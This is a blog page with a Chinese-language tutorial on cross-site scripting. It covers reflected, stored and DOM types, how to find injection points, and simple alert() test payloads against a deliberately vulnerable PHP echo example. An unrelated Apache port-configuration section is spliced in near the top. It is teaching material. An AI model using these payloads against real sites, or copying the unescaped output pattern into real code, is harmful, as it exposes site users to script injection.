

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="https:&#x2F;&#x2F;tech.meituan.com&#x2F;2018&#x2F;09&#x2F;27&#x2F;fe-security.html   https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4067?u_atoken&#x3D;a25f11ca74f22373d41d62140c657ef3&amp;u_asig&#x3D;1a0c380917295960332866929e0040&amp;time__1311&#x3D;Gu0QY5GKiKDIKCqGX">
<meta property="og:type" content="article">
<meta property="og:title" content="YxY">
<meta property="og:url" content="http://example.com/2025/05/03/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/index.html">
<meta property="og:site_name" content="YxY">
<meta property="og:description" content="https:&#x2F;&#x2F;tech.meituan.com&#x2F;2018&#x2F;09&#x2F;27&#x2F;fe-security.html   https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4067?u_atoken&#x3D;a25f11ca74f22373d41d62140c657ef3&amp;u_asig&#x3D;1a0c380917295960332866929e0040&amp;time__1311&#x3D;Gu0QY5GKiKDIKCqGX">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:\Users\god\Downloads\1730271966553.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412182029831.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412191453396.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412191512942.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412191514136.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502161533339.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502161501100.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502161541403.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502042305043.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502042305883.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502091357373.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502091517277.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502091518873.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202503111106530.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202503091911229.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502051833147.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502051833581.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502101400310.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202503101444923.png">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-1395971/g4ddgkudbj.png">
<meta property="og:image" content="c:\Users\god\Downloads\1731588259898.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202411212132134.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412081726791.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412081438728.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412131242978.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412181140531.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412181140263.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412192034803.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501081452962.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501111501897.png">
<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501111502586.png">
<meta property="og:image" content="http://example.com/?q=`%20%EF%BC%8C%E5%85%B3%E9%94%AE%E6%98%AF%E8%BF%99%E4%B8%AA`%3Cimg%3E`%E6%A0%87%E7%AD%BE%E6%B2%A1%E6%9C%89%E9%97%AD%E5%90%88%EF%BC%8C%E5%B1%9E%E6%80%A7%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%94%A8%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8B%AC%E8%B5%B7%E6%9D%A5%E3%80%82%20%20%3Cfigure%20class=">
<meta property="og:image" content="https://another-domain.com/bg.png">
<meta property="article:published_time" content="2025-05-03T02:08:43.086Z">
<meta property="article:modified_time" content="2025-05-04T09:21:37.687Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="c:\Users\god\Downloads\1730271966553.png">
  
  
  
  <title>YxY</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"se6YF0XKcnw13arWgvFBsXbS-gzGzoHsz","app_key":"6WQ33Kdt8DUo1OCXIeenGsIp","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>YxY</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text=""></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-05-03 10:08" pubdate>
          2025年5月3日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          14k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          115 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header"></h1>
            
            
              <div class="markdown-body">
                
                <p><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/09/27/fe-security.html">https://tech.meituan.com/2018/09/27/fe-security.html</a>  </p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067?u_atoken=a25f11ca74f22373d41d62140c657ef3&u_asig=1a0c380917295960332866929e0040&time__1311=Gu0QY5GKiKDIKCqGXIeeqC1D9nFodG8KF3UeD">https://xz.aliyun.com/t/4067?u_atoken=a25f11ca74f22373d41d62140c657ef3&amp;u_asig=1a0c380917295960332866929e0040&amp;time__1311=Gu0QY5GKiKDIKCqGXIeeqC1D9nFodG8KF3UeD</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61553520/article/details/130268475">https://blog.csdn.net/qq_61553520/article/details/130268475</a>  </p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6912030758404259854">https://juejin.cn/post/6912030758404259854</a>  </p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1969005">https://cloud.tencent.com/developer/article/1969005</a>  </p>
<p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/da6546b4db2d3df5eedbd6675">https://xie.infoq.cn/article/da6546b4db2d3df5eedbd6675</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/01/xss.html">https://www.sqlsec.com/2020/01/xss.html</a>  </p>
<p><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cqk404p0lnebepb58kj0">https://rivers.chaitin.cn/blog/cqk404p0lnebepb58kj0</a>  </p>
<p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/en/ch1/browser-security-model/">https://aszx87410.github.io/beyond-xss/en/ch1/browser-security-model/</a>  </p>
<p>靶场:  </p>
<p><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://xss.pwnfunction.com/">https://xss.pwnfunction.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://securitymb.github.io/xss/1/?xss=">https://securitymb.github.io/xss/1/?xss=</a>  </p>
<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><p>xss的定义 本质   </p>
<p>xss的产生原理  </p>
<p>为什么能产生  </p>
<p>xss分类  </p>
<p>为什么分类 目的 能达成的效果  </p>
<p>payload(无过滤)    </p>
<p>每种类型的流程  </p>
<p>每种能产生的危害  </p>
<p>js基础   </p>
<p>这么多js代码 如何分析   </p>
<p>哪些有用 哪些没用  </p>
<p>xss在js里面的应用  </p>
<p>xss结合其他漏洞 如何实现  </p>
<p>xss如何钓鱼  </p>
<p>xss如何绕过waf  </p>
<p>哪些函数能绕  </p>
<p>绕过的原理是什么  </p>
<p>如何防御xss 防御的原理  </p>
<p>能不能绕  </p>
<p>再升华一点进一步 也就是前端安全  </p>
<p>包括cors xxe  </p>
<p>在 Apache 中，你可以通过配置虚拟主机（VirtualHost）和自定义端口来实现访问指定端口转到特定页面的功能。这里是配置步骤：</p>
<h3 id="1-启用监听指定端口"><a href="#1-启用监听指定端口" class="headerlink" title="1. 启用监听指定端口"></a>1. 启用监听指定端口</h3><p>首先，确保 Apache 监听目标端口。打开 Apache 的主配置文件（通常是 <code>httpd.conf</code> 或 <code>apache2.conf</code>），并添加 <code>Listen</code> 指令以启用自定义端口。例如：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Listen</span> <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>

<p>这会让 Apache 监听 8080 端口。</p>
<h3 id="2-配置虚拟主机绑定特定端口"><a href="#2-配置虚拟主机绑定特定端口" class="headerlink" title="2. 配置虚拟主机绑定特定端口"></a>2. 配置虚拟主机绑定特定端口</h3><p>在 Apache 的虚拟主机配置文件中（通常位于 <code>/etc/apache2/sites-available/</code> 目录下，文件名可以是 <code>000-default.conf</code>），添加一个新的虚拟主机配置来指定访问页面的端口。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;VirtualHost *<span class="hljs-number">:8080</span>&gt;</span><br>    <span class="hljs-attribute">ServerName</span> example.com   # 替换为你的域名或服务器IP<br><br>    <span class="hljs-comment"># 指定网站根目录</span><br>    <span class="hljs-attribute">DocumentRoot</span> /var/www/html/special-page<br><br>    <span class="hljs-comment"># 配置自定义页面</span><br>    <span class="hljs-section">&lt;Directory /var/www/html/special-page&gt;</span><br>        <span class="hljs-attribute">Options</span> Indexes FollowSymLinks<br>        <span class="hljs-attribute">AllowOverride</span> <span class="hljs-literal">All</span><br>        <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted<br>    <span class="hljs-section">&lt;/Directory&gt;</span><br><br>    <span class="hljs-attribute">ErrorLog</span> <span class="hljs-variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log<br>    <span class="hljs-attribute">CustomLog</span> <span class="hljs-variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined<br><span class="hljs-section">&lt;/VirtualHost&gt;</span><br></code></pre></td></tr></table></figure>

<p>在以上配置中：</p>
<ul>
<li><code>*:8080</code> 表示监听所有 IP 地址上的 8080 端口。</li>
<li><code>DocumentRoot</code> 指定访问 <code>http://example.com:8080</code> 时打开的页面所在的目录。</li>
<li><code>Directory</code> 配置块中允许访问指定的页面路径。</li>
</ul>
<h3 id="3-启用配置并重启-Apache"><a href="#3-启用配置并重启-Apache" class="headerlink" title="3. 启用配置并重启 Apache"></a>3. 启用配置并重启 Apache</h3><p>保存修改后，使用以下命令启用配置并重启 Apache：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启用端口</span><br><span class="hljs-built_in">sudo</span> ufw allow 8080     <span class="hljs-comment"># 如果有防火墙，需要开放此端口</span><br><br><span class="hljs-comment"># 启用站点配置</span><br><span class="hljs-built_in">sudo</span> a2ensite 000-default.conf<br><br><span class="hljs-comment"># 重启Apache服务</span><br><span class="hljs-built_in">sudo</span> systemctl restart apache2<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\god\Downloads\1730271966553.png" srcset="/img/loading.gif" lazyload alt="1730271966553"></p>
<h3 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h3><p>现在，你可以通过 <code>http://your-domain-or-ip:8080</code> 访问 Apache 在该端口配置的页面了。</p>
<h1 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>XSS</strong>（Cross-Site Scripting，跨站脚本攻击）是一种常见的Web安全漏洞。攻击者将恶意脚本（通常是JavaScript）注入到受害者的浏览器中,使之在用户的浏览器上运行，借此窃取用户数据、冒充用户执行操作，甚至控制用户的浏览会话。  </p>
<h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><p>一切注入型漏洞的本质感觉都差不多 都是攻击者通过构造出巧妙的恶意脚本语言 (xss中通常是js代码) 嵌入浏览器页面当中或者是提交并且存储在服务端 当其他用户访问时 攻击者留下的代码就会执行 从而达到攻击效果 <strong>所以前端不要相信来自用户的输入 后端不要相信来自前段的输入</strong>  所以xss产生的原理就是 前端盲目的相信了用户的输出并且没有做任何限制 或者是限制不严格过滤不充分 对于后端来说就是”完全相信”了前端  </p>
<h2 id="攻击需要满足的条件"><a href="#攻击需要满足的条件" class="headerlink" title="攻击需要满足的条件"></a>攻击需要满足的条件</h2><p>1.输入可控 即能自己定义输入的内容(也就是说能够自己写入恶意代码进去 起码要能写并且能嵌入进去或者提交上去)  </p>
<p>2.过滤不严格 即最终能解析执行自己的xss攻击语句  </p>
<p>3.该位置其他用户能访问的到 方便触发弹窗或者其他攻击方式 此条也不是一定需要满足 有些时候通过self-xss配合其他漏洞一起使用也能达到严重的效果  </p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>主流的大致可分为三类  </p>
<p>反射型，存储型，DOM型  </p>
<p><strong>为什么分成这样</strong>  </p>
<p>这三种类型的划分是基于XSS攻击在执行时如何处理恶意代码的方式不同而定义的  </p>
<p><strong>反射型</strong>  </p>
<p>反射型XSS指的是攻击者将恶意代码嵌入URL中并发送给用户。当用户点击该URL时，恶意代码被服务器“反射”回用户的浏览器并立即执行。特点是 恶意代码在页面中即刻运行，不会持久化。  通过用户点击访问包含恶意xss代码的url向服务器发出请求 服务器响应时执行恶意xss代码 整个过程像一次反射 所以被称为反射型 <strong>钓鱼的一把好手</strong>  </p>
<p><strong>存储型</strong>  </p>
<p>恶意的xss代码被存储在服务器上面 例如数据库或者文件系统上面 具有持久性 用户访问含有恶意代码的页面 恶意代码自动执行  </p>
<p>典型的场景就是 留言区 评论区等等  </p>
<p><strong>dom型</strong>  </p>
<p>DOM（Document Object Model）即文档对象模型，是HTML和XML文档的编程接口。它是HTML和XML文档的编程接口。通过DOM，JavaScript可以动态地修改页面的内容、结构和样式. 攻击者可以通过向网页注入恶意JavaScript代码来操控DOM，导致未授权的数据访问或执行.从而导致dom型xss 严格来说 dom型xss其实算是一种反射型xss 不过dom型的xss所做的操作不会与后端产生联系 也就是说 这种xss完全是一个前端的漏洞 这代表着 你构造的攻击语句不会受到后端的waf或者是监测设备的影响 所以要做防御也只能在前端做  </p>
<p><em>HTML定义网页内容，浏览器将其解析为DOM模型，JavaScript通过DOM接口对网页进行动态操作</em>  </p>
<p><strong>上面这些都很好的诠释了很多漏洞的本质都是不安全的用户输入加上不恰当的数据处理操作造成的</strong>  </p>
<hr>
<h2 id="细说"><a href="#细说" class="headerlink" title="细说"></a>细说</h2><p>下面来详细讲讲上述提到的3种主流的xss攻击的详细流程 包括攻击者是如何发现的以及后续攻击者依据该类型的xss漏洞的进攻思路流程 整个xss攻击的从客户端到服务端 或者从攻击者提交payload开始到js代码最后的执行情况 payload的选用(简单版 仅仅只是验证漏洞存在的payload)</p>
<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><h4 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h4><p>这里说手动测试 有些牛逼的工具就不说了  </p>
<p>不管是哪种类型的xss 简单来说 都是要去插入恶意的代码来达到攻击效果 但是要先解决一个最基本的问题 <strong>在哪里插?</strong>  </p>
<p>最简单的办法就是去找一个你输入的内容都会回显到页面上的输入点  </p>
<p>找到之后 再去具体研究这个输出到页面上的内容 是为什么输出的 怎么输出的  </p>
<p>可以<strong>通过html代码里面的标签输出</strong>   </p>
<p>例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    欢迎，<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>用户<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>！<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>像这样一样 直接在用户名字这里输入(假设这个功能点可输入的话) 输入的内容会经过html代码直接输出到页面上  </p>
<p><strong>也可以输出在 HTML 标签的属性中</strong>  </p>
<p>例如href属性里面  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://example.com/user?name=用户&quot;</span>&gt;</span>点击此处查看详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <br></code></pre></td></tr></table></figure>

<p>例如是这样 假设name参数可控 </p>
<p>输入 “ onmouseover&#x3D;”alert(‘XSS!’)  </p>
<p>整串代码就变成了 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;https://example.com/user?name=&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;XSS!&#x27;)&quot;</span>&gt;点击此处查看详情&lt;/a&gt;<br></code></pre></td></tr></table></figure>

<p>这样 当鼠标悬停在上面时 就会触发弹窗  </p>
<p>还有一种常见的情况<strong>是内容输出在 JavaScript 代码内部</strong>  </p>
<p>例如  </p>
<script>
    var username = "用户";
    alert("欢迎，" + username + "！");
</script>

<p>如果username这个参数可控  </p>
<p>可以尝试去闭合并且直接添加恶意代码引发xss  </p>
<h4 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h4><p>这里的如何查找指的就是如何由找到一个输入什么输出什么的功能点定位到背后的代码  </p>
<p>最简单的办法就是F12或者查看页面源代码  </p>
<p>直接在那个输入点里面随便输入一串东西 再去F12里面全局搜索 即可定位到相关代码片段  </p>
<p>然后再去分析相应的代码块  </p>
<p>思考如何闭合能达到实现xss攻击的效果  </p>
<hr>
<p>除了分析代码块 更重要的是通过f12能找到更多的隐藏起来的数据回显或者叫数据输出位置  </p>
<p>找到这些位置 能扩大攻击面 在那些直接的数据回显点被waf拦截的情况下 这些隐藏起来的 可能会产生意想不到的作用  </p>
<p><strong>以上的这些基本是3种主流xss的比较通用的发现方式</strong></p>
<h4 id="测试用的payload来确定是否具有漏洞"><a href="#测试用的payload来确定是否具有漏洞" class="headerlink" title="测试用的payload来确定是否具有漏洞"></a>测试用的payload来确定是否具有漏洞</h4><p>现在去测试反射型的xss是否存在一般可以采用如下几个payload  </p>
<p><strong>使用 <code>&lt;img &gt;</code> 标签</strong>  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(1)&gt; <br></code></pre></td></tr></table></figure>

<p>利用图片加载错误触发 onerror 事件并执行 alert，可以测试是否存在反射型 XSS。</p>
<p>这种方式因为是 <code>img</code> 标签，不容易被过滤，且触发条件相对灵活。  </p>
<p>或者<strong>使用不同标签支持的各种事件属性</strong>去测试   </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> onmouseover=alert(<span class="hljs-number">1</span>)&gt;Hover <span class="hljs-keyword">me</span>!&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure>

<p>即类似于这种的payload  </p>
<h4 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h4><p>反射型的xss的利用一般是在url里面  </p>
<p>例如: <a target="_blank" rel="noopener" href="http://www.xxx.com/key?id=(payload)">http://www.xxx.com/key?id=(payload)</a>  </p>
<p>由上面可知 这里的id可控 并且过滤不严格  </p>
<p>攻击者构造恶意的payload作为id的值 然后将修改过的url发送给受害者  </p>
<p>受害者访问该URL之后，受害者的浏览器把恶意JS代码发送到服务端，服务端原样返回并加载到受害者浏览器前端，从而执行恶意JS代码完成攻击  </p>
<p>例如:  </p>
<p>源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-comment">// 获取用户输入的搜索关键词</span><br>  <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;keyword&#x27;</span>];<br><br>  <span class="hljs-comment">// 在 HTML 中输出用户输入</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;搜索结果：<span class="hljs-subst">$keyword</span>&lt;/h1&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>恶意url:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://example.com/search.php?keyword=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>最终:  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>搜索结果：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>浏览器解析时，会执行 <code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>，导致弹出 XSS 提示框 <code>XSS</code>。此时，反射型 XSS 攻击便成功了  </p>
